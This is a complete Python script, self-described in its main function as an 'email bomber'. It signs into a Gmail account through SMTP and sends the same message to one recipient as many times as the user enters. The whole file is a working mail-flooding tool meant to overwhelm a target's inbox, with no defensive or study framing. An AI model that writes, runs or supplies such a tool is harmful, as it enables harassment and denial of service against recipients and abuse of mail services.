import smtplib
from getpass import getpass

def setup_smtp_server():
    """Establishes connection with the Gmail SMTP server."""
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    return server

def login_to_email(server):
    """Logs into the email account using user-provided credentials."""
    email = input("Enter Your Email: ")
    password = getpass("Enter Your Password: ")

    try:
        server.login(email, password)
        print("Successfully signed in.")
        return email
    except smtplib.SMTPAuthenticationError:
        print("Failed to authenticate. Please check your email and password.")
        return None

def send_emails(server, sender_email):
    """Sends emails to the target address based on user input."""
    recipient_email = input("Enter Recipient's Email: ")
    try:
        num_emails = int(input("Enter the number of messages to send: "))
    except ValueError:
        print("Invalid input. Please enter a valid number.")
        return

    message = input("Enter your message: \n")

    print("Starting to send emails...")
    for count in range(num_emails):
        try:
            server.sendmail(sender_email, recipient_email, message)
            print(f"[{count + 1}] Email sent successfully.")
        except Exception as e:
            print(f"[{count + 1}] Failed to send email: {e}")

    print("All emails sent.")

def main():
    """Main function to handle the email bomber process."""
    try:
        server = setup_smtp_server()
        sender_email = login_to_email(server)

        if sender_email:
            send_emails(server, sender_email)
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        server.quit()
        print("SMTP server connection closed.")

if __name__ == "__main__":
    main()
